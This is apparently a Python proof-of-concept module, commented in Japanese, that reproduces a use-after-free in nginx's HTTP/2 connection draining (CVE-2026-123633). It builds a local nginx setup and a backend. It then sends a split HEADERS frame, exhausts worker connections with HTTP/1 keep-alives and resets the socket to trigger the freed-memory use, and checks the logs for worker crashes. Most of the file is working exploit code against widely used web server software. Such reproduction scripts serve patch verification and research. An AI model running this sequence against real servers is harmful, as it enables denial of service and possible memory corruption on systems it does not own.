#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-123633: HTTP/2 reusable 接続の UAF（drain 時）自己完結再現モジュール.

公開 API:
    run(binary: str, workdir: str, host: str = "127.0.0.1") -> dict

戻り値: {"cve","configured","trigger","effect","detail"}
effect: UAF | CRASH | TRIGGERED | ERROR | SKIP

概要:
  worker_connections 64。HTTP/2 (TLS 18444) で HEADERS フレームの先頭 1 バイトだけ
  を送ると、ストリーム未生成のまま接続が reusable キューに登録される
  (ngx_http_v2_handle_connection の incomplete 早期 return 経路)。
  そのまま HTTP/1 keep-alive (18445) でスロットを埋め、free_connection_n を
  connection_n/16 以下にした後、残りの HEADERS を送ってストリームを作る。
  このとき reusable 状態が解除されないため、proxy_pass の upstream 接続要求
  (ngx_get_connection) が drain を呼び、自分の HTTP/2 接続を close 対象に選ぶ。
  GOAWAY の書き込みがクライアント RST で失敗すると finalize でリクエストの
  プールが解放され、その後の upstream 処理が解放済みメモリを使う (UAF)。
  1.31.9 では 2df48a5 でストリーム生成時に reusable 状態を解除するため drain に
  選ばれず、クラッシュしない。
"""
import os
import re
import shutil
import signal
import socket
import ssl
import struct
import subprocess
import threading
import time

CVE = "CVE-2026-123633"
HOST_DEFAULT = "127.0.0.1"
P_H2 = 18444
P_H1 = 18445
P_BACKEND = 19000
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

CONF_TMPL = """\
worker_processes 1;
daemon on;
pid %(prefix)s/nginx.pid;
error_log %(prefix)s/logs/error.log debug;

events {
    worker_connections 64;
}

http {
    access_log off;
    client_body_temp_path %(prefix)s/tmp/client;
    proxy_temp_path %(prefix)s/tmp/proxy;

    server {
        listen 127.0.0.1:%(h2_port)d ssl;
        http2 on;
        ssl_certificate     %(cert)s;
        ssl_certificate_key %(key)s;
        ssl_protocols       TLSv1.2 TLSv1.3;

        location / {
            proxy_pass http://127.0.0.1:%(backend_port)d;
        }
    }

    server {
        listen 127.0.0.1:%(h1_port)d;

        location / {
            return 200 "ok\\n";
        }
    }
}
"""


class Backend(threading.Thread):
    """19000/TCP の単純な HTTP バックエンド。"""

    def __init__(self, host, port):
        super().__init__(daemon=True)
        self.host = host
        self.port = port
        self.sock = None
        self.running = True
        self.hits = 0

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        for _attempt in range(40):
            try:
                s.bind((self.host, self.port))
                break
            except OSError:
                time.sleep(0.05)
        else:
            return
        s.listen(128)
        s.settimeout(0.2)
        self.sock = s
        while self.running:
            try:
                c, _ = s.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._handle, args=(c,), daemon=True).start()
        try:
            s.close()
        except OSError:
            pass

    def _handle(self, c):
        try:
            c.settimeout(2)
            data = b""
            while b"\r\n\r\n" not in data:
                d = c.recv(4096)
                if not d:
                    return
                data += d
            self.hits += 1
            c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nOK")
        except OSError:
            pass
        finally:
            try:
                c.close()
            except OSError:
                pass

    def stop(self):
        self.running = False
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass


# ---- HTTP/2 / HPACK 最小実装 -------------------------------------------------

def _hpack_int(n, prefix_bits, first=0):
    maxp = (1 << prefix_bits) - 1
    if n < maxp:
        return bytes([first | n])
    out = bytearray([first | maxp])
    n -= maxp
    while n >= 128:
        out.append((n & 0x7f) | 0x80)
        n >>= 7
    out.append(n)
    return bytes(out)


def _hpack_str(s):
    b = s.encode() if isinstance(s, str) else s
    return _hpack_int(len(b), 7) + b


def _encode_headers(pairs):
    out = bytearray()
    for k, v in pairs:
        out += b"\x00" + _hpack_str(k) + _hpack_str(v)
    return bytes(out)


def _frame(typ, flags, sid, payload=b""):
    return struct.pack("!I", len(payload))[1:] + bytes([typ, flags]) + \
        struct.pack("!I", sid) + payload


def _h2_connect(host, port, timeout=3):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    raw = socket.create_connection((host, port), timeout=timeout)
    return ctx.wrap_socket(raw, server_hostname="localhost")


# ---- nginx 制御 --------------------------------------------------------------

def _ensure_cert(base):
    cert_dir = os.path.join(base, "certs")
    os.makedirs(cert_dir, exist_ok=True)
    cert = os.path.join(cert_dir, "cert.pem")
    key = os.path.join(cert_dir, "key.pem")
    if not (os.path.isfile(cert) and os.path.isfile(key)):
        subprocess.run(
            ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-days", "2",
             "-keyout", key, "-out", cert, "-subj", "/CN=localhost",
             "-addext", "subjectAltName=DNS:localhost,IP:127.0.0.1"],
            check=True, capture_output=True)
    os.chmod(cert, 0o644)
    os.chmod(key, 0o644)
    return cert, key


def _prepare(base, prefix):
    for d in ("logs", "tmp/client", "tmp/proxy"):
        os.makedirs(os.path.join(prefix, d), exist_ok=True)
    cert, key = _ensure_cert(base)
    conf = CONF_TMPL % dict(prefix=prefix, h2_port=P_H2, h1_port=P_H1,
                            backend_port=P_BACKEND, cert=cert, key=key)
    conf_path = os.path.join(prefix, "nginx.conf")
    with open(conf_path, "w") as f:
        f.write(conf)
    return conf_path


def _kill_by_cmdline(tag):
    for pd in os.listdir("/proc"):
        if not pd.isdigit():
            continue
        try:
            cmd = open("/proc/%s/cmdline" % pd, "rb").read().replace(b"\0", b" ").decode("utf-8", "replace")
        except OSError:
            continue
        if tag in cmd and "nginx" in cmd:
            try:
                os.kill(int(pd), signal.SIGKILL)
            except OSError:
                pass


def _start_nginx(binary, prefix, conf_path):
    proc = subprocess.run([binary, "-p", prefix + "/", "-c", conf_path],
                          capture_output=True, text=True, timeout=15)
    if proc.returncode != 0:
        raise RuntimeError((proc.stderr or proc.stdout).strip())
    deadline = time.time() + 5
    while time.time() < deadline:
        try:
            s = socket.create_connection((HOST_DEFAULT, P_H1), timeout=0.2)
            s.close()
            time.sleep(0.3)  # ポート確認用の接続スロットが解放されるのを待つ
            return
        except OSError:
            time.sleep(0.05)
    raise RuntimeError("listen 127.0.0.1:%d が開かない" % P_H1)


def _stop_nginx(prefix):
    pid = None
    try:
        pid = int(open(os.path.join(prefix, "nginx.pid")).read().strip())
    except Exception:
        pid = None
    if pid:
        try:
            os.kill(pid, signal.SIGTERM)
        except OSError:
            pass
        deadline = time.time() + 3
        while time.time() < deadline:
            try:
                os.kill(pid, 0)
            except ProcessLookupError:
                break
            time.sleep(0.05)
        try:
            os.kill(pid, signal.SIGKILL)
        except OSError:
            pass
    _kill_by_cmdline(prefix)


def _collect(prefix):
    """error_log から (crash, h2再利用回数, drain回数, GOAWAY(last sid 1), stream生成直後のreusable解除) を返す。"""
    path = os.path.join(prefix, "logs", "error.log")
    try:
        text = open(path, errors="ignore").read()
    except OSError:
        return [], 0, 0, [], False
    crashes, drains, goaway_sid1 = [], [], []
    reusable_reset = False
    pending_stream = 0
    for line in text.splitlines():
        if re.search(r"worker process \d+ exited on signal (\d+)", line) or "segmentation fault" in line:
            crashes.append(line.strip())
        if "worker_connections are not enough" in line:
            drains.append(line.strip())
        if "send GOAWAY frame" in line and "last sid 1" in line:
            goaway_sid1.append(line.strip())
        if "http2 HEADERS frame sid:1" in line:
            pending_stream = 5
            continue
        if pending_stream:
            if "reusable connection: 0" in line:
                reusable_reset = True
                pending_stream = 0
            elif "reusable connection:" in line:
                pending_stream = 0
            else:
                pending_stream -= 1
    # 「ストリーム持ちのまま drain で再利用された」決定的マーカーは GOAWAY last sid 1
    return crashes, len(goaway_sid1), len(drains), goaway_sid1, reusable_reset


def _make_keepalives(n):
    conns = []
    for _ in range(n):
        try:
            s = socket.create_connection((HOST_DEFAULT, P_H1), timeout=2)
            s.settimeout(2)
            s.sendall(b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
            buf = b""
            while b"\r\n\r\n" not in buf:
                d = s.recv(4096)
                if not d:
                    break
                buf += d
            conns.append(s)
        except OSError:
            pass
    return conns


def _attempt(binary, prefix, conf_path, nkeep):
    h2s = None
    keep = []
    try:
        _start_nginx(binary, prefix, conf_path)
        # 1) HTTP/2: preface + SETTINGS + HEADERS フレームの先頭 1 バイトのみ
        h2s = _h2_connect(HOST_DEFAULT, P_H2)
        block = _encode_headers([(":method", "GET"), (":path", "/"),
                                 (":scheme", "https"), (":authority", "localhost")])
        head = _frame(0x1, 0x5, 1, block)  # END_STREAM|END_HEADERS
        h2s.sendall(PREFACE + _frame(0x4, 0, 0) + head[:1])
        time.sleep(0.03)
        # 2) HTTP/1 keep-alive でスロットを埋める
        keep = _make_keepalives(nkeep)
        time.sleep(0.05)
        # 3) 残りの HEADERS を送って即 RST
        h2s.sendall(head[1:])
        h2s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
        h2s.close()
        h2s = None
        time.sleep(0.35)
    finally:
        if h2s is not None:
            try:
                h2s.close()
            except OSError:
                pass
        for s in keep:
            try:
                s.close()
            except OSError:
                pass
        _stop_nginx(prefix)
        time.sleep(0.05)


def run(binary, workdir, host="127.0.0.1"):
    """CVE-2026-123633 を再現する。"""
    del host
    base = os.path.abspath(os.path.join(workdir, "cve-2026-123633"))
    os.makedirs(base, exist_ok=True)
    result = {
        "cve": CVE,
        "configured": False,
        "trigger": ("worker_connections 64 で HTTP/2 の HEADERS 先頭 1 バイトのみ送って reusable 登録 → "
                    "HTTP/1 keep-alive でスロットを埋める → 残り HEADERS でストリーム生成 → upstream 接続要求の "
                    "drain が自分の HTTP/2 接続を close → GOAWAY 書き込み失敗 (クライアント RST) → finalize で "
                    "リクエスト解放 → UAF。"),
        "effect": "ERROR",
        "detail": "",
    }
    backend = None
    try:
        conf_path = _prepare(base, os.path.join(base, "run"))
        test = subprocess.run([binary, "-t", "-p", os.path.join(base, "run") + "/",
                               "-c", conf_path],
                              capture_output=True, text=True, timeout=15)
        if test.returncode != 0:
            result["effect"] = "SKIP"
            result["detail"] = "nginx -t 失敗: " + (test.stderr or test.stdout).strip()
            return result
        result["configured"] = True

        backend = Backend(HOST_DEFAULT, P_BACKEND)
        backend.start()
        time.sleep(0.2)

        all_crashes, all_goaway = [], []
        h2_reused_total = 0
        drain_total = 0
        reset_seen = False
        attempts = []
        for idx, nkeep in enumerate((56, 55, 57, 54, 58)):
            prefix = os.path.join(base, "run%d" % idx)
            if os.path.isdir(prefix):
                shutil.rmtree(prefix)
            conf_path = _prepare(base, prefix)
            _attempt(binary, prefix, conf_path, nkeep)
            crashes, h2_reused, drains, goaway, reset = _collect(prefix)
            attempts.append(dict(nkeep=nkeep, crash=len(crashes), reused=h2_reused,
                                 drain=drains, reset=reset))
            all_crashes += crashes
            all_goaway += goaway
            h2_reused_total += h2_reused
            drain_total += drains
            reset_seen = reset_seen or reset
            if crashes:
                break

        if all_crashes:
            result["effect"] = "CRASH"
        elif h2_reused_total:
            result["effect"] = "UAF"
        else:
            result["effect"] = "TRIGGERED"

        detail = [
            "prefix=%s" % base,
            "attempts=" + ", ".join("nkeep=%d crash=%d h2reuse=%d drain=%d reset=%d" %
                                    (a["nkeep"], a["crash"], a["reused"], a["drain"],
                                     1 if a["reset"] else 0)
                                    for a in attempts),
            "backend ヒット数=%d / drain 発動回数=%d / h2 再利用回数=%d" %
            (backend.hits, drain_total, h2_reused_total),
            "stream 生成直後の reusable 解除: %s" % ("あり（1.31.9 の修正挙動）" if reset_seen else "なし（1.31.8）"),
        ]
        if all_crashes:
            detail.append("クラッシュ: " + all_crashes[0])
            detail.append("検出したワーカー異常終了: %d 件" % len(all_crashes))
            if all_goaway:
                detail.append("drain がストリーム持ち HTTP/2 接続を再利用: " + all_goaway[0])
        elif h2_reused_total:
            detail.append("drain がストリーム持ち HTTP/2 接続を再利用 (クラッシュ無し)")
        elif drain_total:
            detail.append("drain は発動したがストリーム持ち HTTP/2 接続は再利用されず、クラッシュも無し（修正版の挙動）")
        else:
            detail.append("drain 未発動（スロット枯渇に届かず）")
        result["detail"] = " / ".join(detail)
        return result
    except Exception as exc:  # noqa: BLE001
        result["effect"] = "ERROR"
        result["detail"] = "%s: %s" % (type(exc).__name__, exc)
        return result
    finally:
        if backend is not None:
            backend.stop()
        time.sleep(0.05)


if __name__ == "__main__":
    import json
    import sys
    b = sys.argv[1] if len(sys.argv) > 1 else "/app/data/sessions/conv-43/build/inst-vuln/sbin/nginx"
    w = sys.argv[2] if len(sys.argv) > 2 else "/app/data/sessions/conv-43/poc-run-B"
    print(json.dumps(run(b, w), ensure_ascii=False, indent=2))
